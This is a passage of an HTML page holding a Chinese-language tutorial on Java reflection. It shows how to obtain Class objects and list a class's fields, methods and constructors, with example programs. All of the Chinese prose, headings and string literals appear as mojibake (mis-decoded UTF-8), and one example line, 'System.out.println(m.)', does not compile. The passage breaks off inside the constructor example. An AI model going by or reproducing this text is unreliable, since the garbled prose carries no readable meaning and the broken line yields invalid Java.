punctuation">;</span></code></pre><p>è€Œæˆ‘ä»¬åœ¨åˆ›å»ºclassç±»çš„å®ä¾‹å¯¹è±¡å´ä¸èƒ½ä½¿ç”¨ä¸Šè¿°æ–¹æ³•ï¼Œè¿è¡Œä¼šæŠ›å‡ºé”™è¯¯</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="3.png" loading="lazy"></p><p>åŒæ—¶æˆ‘ä»¬å¯ä»¥è·Ÿè¿›Classç±»çš„æºç è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°å…¶æ„é€ å™¨æ˜¯ç§æœ‰çš„ï¼Œæ‰€ä»¥åªæœ‰JVMèƒ½å¤Ÿåˆ›å»ºClasså¯¹è±¡ã€‚</p><p><img src="4.png" loading="lazy"></p><p>å› ä¸ºClassç±»æ˜¯privateç§æœ‰å±æ€§ï¼Œæˆ‘ä»¬ä¹Ÿæ— æ³•é€šè¿‡åˆ›å»ºå¯¹è±¡çš„æ–¹å¼æ¥è·å–classå¯¹è±¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€æ ·æ‰èƒ½å¤Ÿè·å–åˆ°classå¯¹è±¡å‘¢ï¼Ÿä¸€èˆ¬æˆ‘ä»¬è·å–classå¯¹è±¡å°±æœ‰ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ï¼Œæˆ‘ä»¬æ¥é€ä¸€çœ‹çœ‹ã€‚</p><h4 id="1ã€ç±»çš„-classå±æ€§"><a href="#1ã€ç±»çš„-classå±æ€§" class="headerlink" title="1ã€ç±»çš„.classå±æ€§"></a>1ã€ç±»çš„.classå±æ€§</h4><p>ç¬¬ä¸€ç§å°±æ˜¯æœ€ç®€å•æ˜äº†çš„æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç±»åçš„å±æ€§classè·å–ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> c1<span class="token operator">=</span><span class="token class-name">ReflectDemo</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span></code></pre><h4 id="2ã€å®ä¾‹åŒ–å¯¹è±¡çš„getClass-æ–¹æ³•"><a href="#2ã€å®ä¾‹åŒ–å¯¹è±¡çš„getClass-æ–¹æ³•" class="headerlink" title="2ã€å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•"></a>2ã€å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•</h4><p>ç¬¬äºŒç§æˆ‘ä»¬å¯ä»¥å…ˆå®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œä¹‹ååœ¨è°ƒç”¨getClass()æ–¹æ³•ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ReflectDemo</span> demo2<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectDemo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span> c2 <span class="token operator">=</span> demo2<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="3ã€Class-forName-String-className-ï¼šåŠ¨æ€åŠ è½½ç±»"><a href="#3ã€Class-forName-String-className-ï¼šåŠ¨æ€åŠ è½½ç±»" class="headerlink" title="3ã€Class.forName(String className)ï¼šåŠ¨æ€åŠ è½½ç±»"></a>3ã€Class.forName(String className)ï¼šåŠ¨æ€åŠ è½½ç±»</h4><p>ç¬¬ä¸‰ç§åˆ™æ˜¯è°ƒç”¨Classç±»ä¸­çš„forNameæ–¹æ³•ï¼Œå°†å­—èŠ‚ç æ–‡ä»¶åŠ è½½è¿›å†…å­˜ï¼Œè¿”å›Classå¯¹è±¡ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> c3 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"reflectdemo.ReflectDemo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æˆ‘ä»¬å¯ä»¥å†™ä¸ªç®€å•çš„ç¤ºä¾‹ä»£ç ï¼Œåˆ†åˆ«åˆ©ç”¨è¿™ä¸‰ç§æ–¹æ³•è·å–å½“å‰ç±»Classå¯¹è±¡çš„å½“å‰ç±»åã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectTemo</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// ç±»çš„.classå±æ€§</span>      <span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">ReflectTemo</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•</span>      <span class="token class-name">ReflectTemo</span> demo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectTemo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">Class</span> c2 <span class="token operator">=</span> demo<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Class.forName(String className): åŠ¨æ€åŠ è½½ç±»</span>      <span class="token class-name">Class</span> c3 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.ReflectTemo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c3<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="5.png" loading="lazy"></p><p>ä½†åœ¨è¿™ä¸‰ç§è·å–CLassç±»æ–¹å¼ä¸­ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨ç¬¬ä¸‰ç§é€šè¿‡Class.forNameæ–¹æ³•å»åŠ¨æ€åŠ è½½ç±»ã€‚ä¸”ä½¿ç”¨forNameå°±ä¸éœ€è¦importå¯¼å…¥å…¶ä»–ç±»ï¼Œå¯ä»¥åŠ è½½æˆ‘ä»¬ä»»æ„çš„ç±»ã€‚</p><p>è€Œä½¿ç”¨ç±».classå±æ€§ï¼Œéœ€è¦å¯¼å…¥ç±»çš„åŒ…ï¼Œä¾èµ–æ€§å¤ªå¼ºï¼Œåœ¨å¤§å‹é¡¹ç›®ä¸­å®¹æ˜“æŠ›å‡ºç¼–è¯‘é”™è¯¯ï¼›</p><p>è€Œä½¿ç”¨å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•ï¼Œéœ€è¦æœ¬èº«åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œæœ¬èº«å°±æ²¡æœ‰äº†ä½¿ç”¨åå°„æœºåˆ¶æ„ä¹‰ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨è·å–classå¯¹è±¡ä¸­ï¼Œä¸€èˆ¬ä½¿ç”¨Class.forNameæ–¹æ³•å»è·å–ã€‚</p><h3 id="è·å–æˆå‘˜å˜é‡Field"><a href="#è·å–æˆå‘˜å˜é‡Field" class="headerlink" title="è·å–æˆå‘˜å˜é‡Field"></a>è·å–æˆå‘˜å˜é‡Field</h3><p>è·å–æˆå‘˜å˜é‡Fieldä½äºjava.lang.reflect.FieldåŒ…ä¸­</p><p>Field[] getFields() ï¼šè·å–æ‰€æœ‰publicä¿®é¥°çš„æˆå‘˜å˜é‡</p><p>Field[] getDeclaredFields() è·å–æ‰€æœ‰çš„æˆå‘˜å˜é‡ï¼Œä¸è€ƒè™‘ä¿®é¥°ç¬¦</p><p>Field getField(String name) è·å–æŒ‡å®šåç§°çš„ publicä¿®é¥°çš„æˆå‘˜å˜é‡</p><p>Field getDeclaredField(String name) è·å–æŒ‡å®šçš„æˆå‘˜å˜é‡</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FieldTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> profession<span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> number<span class="token punctuation">;</span>    <span class="token keyword">char</span> sex<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.FieldTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åˆ›å»ºClasså¯¹è±¡</span>            <span class="token class-name">Field</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fieldArray1 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è·å–å…¨éƒ¨æˆå‘˜å˜é‡</span>            <span class="token class-name">Field</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fieldArray2 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// è·å–å…¨éƒ¨publicæˆå‘˜å˜é‡</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Field</span> field <span class="token operator">:</span> fieldArray1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------åˆ†å‰²çº¿---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Field</span> field <span class="token operator">:</span> fieldArray2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------åˆ†å‰²çº¿---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">Field</span> fieldArray3 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è·å–æŒ‡å®šåç§°çš„publicä¿®é¥°çš„æˆå‘˜å˜é‡</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>fieldArray3<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------åˆ†å‰²çº¿---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">Field</span> fieldArray4 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è·å–æŒ‡å®šçš„æˆå‘˜å˜é‡</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>fieldArray4<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="6.png" loading="lazy"></p><h3 id="è·å–æˆå‘˜æ–¹æ³•Method"><a href="#è·å–æˆå‘˜æ–¹æ³•Method" class="headerlink" title="è·å–æˆå‘˜æ–¹æ³•Method"></a>è·å–æˆå‘˜æ–¹æ³•Method</h3><p>Method getMethod(String name, ç±»&lt;?&gt;â€¦ parameterTypes) &#x2F;&#x2F;è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„publicæ–¹æ³•</p><p>Method getDeclaredMethod(String name, ç±»&lt;?&gt;â€¦ parameterTypes) &#x2F;&#x2F;è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„æ‰€æœ‰æ–¹æ³•</p><p>&#x2F;&#x2F;ç¬¬ä¸€ä¸ªå‚æ•°è·å–è¯¥æ–¹æ³•çš„åå­—ï¼Œç¬¬äºŒä¸ªå‚æ•°è·å–æ ‡è¯†è¯¥æ–¹æ³•çš„å‚æ•°ç±»å‹</p><p>Method[] getMethods() &#x2F;&#x2F;è·å–æ‰€æœ‰çš„publicæ–¹æ³•ï¼ŒåŒ…æ‹¬ç±»è‡ªèº«å£°æ˜çš„publicæ–¹æ³•ï¼Œçˆ¶ç±»ä¸­çš„publicæ–¹æ³•ã€å®ç°çš„æ¥å£æ–¹æ³•</p><p>Method[] getDeclaredMethods() &#x2F;&#x2F; è·å–è¯¥ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MethodTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">study</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"å­¦ä¹ ä¸­..."</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è·‘æ­¥ä¸­..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"åƒé¥­ä¸­..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ç¡çœ ä¸­..."</span> <span class="token operator">+</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"sleep"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.MethodTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åˆ›å»ºClasså¯¹è±¡</span>            <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods1 <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è·å–æ‰€æœ‰è¯¥ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•</span>            <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods2 <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è·å–æ‰€æœ‰çš„publicæ–¹æ³•ï¼ŒåŒ…æ‹¬ç±»è‡ªèº«å£°æ˜çš„publicæ–¹æ³•ï¼Œçˆ¶ç±»ä¸­çš„publicæ–¹æ³•ã€å®ç°çš„æ¥å£æ–¹æ³•</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> m<span class="token operator">:</span>methods1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------åˆ†å‰²çº¿---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> m<span class="token operator">:</span>methods2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------åˆ†å‰²çº¿---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Method</span> methods3 <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"study"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è·å–studyæ–¹æ³•</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>methods3<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------åˆ†å‰²çº¿---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Method</span> method4 <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"sleep"</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è·å–sleepæ–¹æ³•</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>method4<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="7.png" loading="lazy"></p><h3 id="è·å–æ„é€ å‡½æ•°Constructor"><a href="#è·å–æ„é€ å‡½æ•°Constructor" class="headerlink" title="è·å–æ„é€ å‡½æ•°Constructor"></a>è·å–æ„é€ å‡½æ•°Constructor</h3><p>Constructor&lt;?&gt;[] getConstructors() ï¼šåªè¿”å›publicæ„é€ å‡½æ•°</p><p>Constructor&lt;?&gt;[] getDeclaredConstructors() ï¼šè¿”å›æ‰€æœ‰æ„é€ å‡½æ•°</p><p>Constructor&lt;&gt; getConstructor(ç±»&lt;?&gt;â€¦ parameterTypes) : åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„publicæ„é€ å‡½æ•°</p><p>Constructor&lt;&gt; getDeclaredConstructor(ç±»&lt;?&gt;â€¦ parameterTypes) ï¼š åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„æ„é€ å‡½æ•°</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConstructorTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">ConstructorTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æ— å‚æ„é€ å‡½æ•°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">ConstructorTest</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æœ‰å‚æ„é€ å‡½æ•°"</span> <span class="token operator">+</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">ConstructorTest</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ç§æœ‰æ„é€ å‡½æ•°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.ConstructorTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Constructor</span><span class="token punctuation">[</span><span class="token punctuation">]</span> constructors1  <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Constructor</span><span class="token punctuation">[</span><span class="token punctuation">]</span> constructors2 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Constructor</span> c <span class="token operator">:</span> constructors1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------åˆ†å‰²çº¿---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Constructor</span> c <span class="token operator">:</span> constructors2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------åˆ†å‰²çº¿---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Constructor</span> constructors3 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>constructors3<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------åˆ†å‰²çº¿---------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Constructor</span> constructors4 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">boolean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>constructors4<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    